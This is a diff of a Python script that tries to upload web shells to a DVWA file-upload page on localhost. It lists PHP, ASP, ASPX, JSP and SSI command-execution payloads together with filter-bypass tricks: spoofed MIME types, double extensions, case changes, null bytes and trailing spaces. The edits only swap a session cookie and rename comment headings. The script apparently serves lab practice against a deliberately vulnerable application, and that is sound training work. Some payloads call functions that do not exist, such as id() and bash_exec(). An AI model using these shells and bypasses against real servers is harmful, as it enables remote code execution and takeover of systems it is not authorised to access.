@@ -3,16 +3,16 @@ import random
 import time
 
 TARGET = 'http://localhost:8080/vulnerabilities/upload/'
-COOKIES = {'PHPSESSID': '278ab58002dbd5f0e20387685d3f6a8e', 'security': 'low'}
+COOKIES = {'PHPSESSID': '35cacc52bfc92dc522e7638831ba3474', 'security': 'low'}
 
 FILES_LIST = [
-    # --- Basic: Spoof MIME type and Content-Type ---
+    # --- Spoof MIME type and Content-Type ---
     ('shell.php', '<?php system($_GET["cmd"]); ?>', 'image/jpeg'),
     ('shell.php3', '<?php system($_GET["cmd"]); ?>', 'image/png'),
     ('shell.php4', '<?php system($_GET["cmd"]); ?>', 'image/gif'),
     ('shell.php5', '<?php system($_GET["cmd"]); ?>', 'application/pdf'),
     
-    # --- Medium: Double Extensions & Case Insensitive ---
+    # --- Double Extensions & Case Insensitive ---
     ('shell.php.jpg', '<?php phpinfo(); ?>', 'image/jpeg'),
     ('shell.jpg.php', '<?php phpinfo(); ?>', 'application/x-httpd-php'),
     ('shell.PHP', '<?php id(); ?>', 'image/png'),
@@ -20,13 +20,13 @@ FILES_LIST = [
     ('shell.phtml', '<?php system($_GET["cmd"]); ?>', 'image/png'),
     ('shell.phpt', '<?php system($_GET["cmd"]); ?>', 'image/jpeg'),
     
-    # --- Advanced: Alternative Languages & Architectures ---
+    # --- Alternative Languages & Architectures ---
     ('shell.shtml', '<!--#exec cmd="ls" -->', 'text/html'),
     ('shell.asp', '<% eval request("cmd") %>', 'text/plain'),
     ('shell.aspx', '<%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c whoami").StandardOutput.ReadToEnd()); %>', 'text/plain'),
     ('shell.jsp', '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', 'text/plain'),
     
-    # --- Advanced: Null Bytes, Whitespace, & Magic Bytes Injection ---
+    # --- Null Bytes, Whitespace, & Magic Bytes Injection ---
     ('shell.php%00.png', '<?php bash_exec(); ?>', 'image/png'),
     ('shell.php\\x00.jpg', '<?php bash_exec(); ?>', 'image/jpeg'),
     ('shell.php ', '<?php bash_exec(); ?>', 'image/jpeg'), # Trailing space
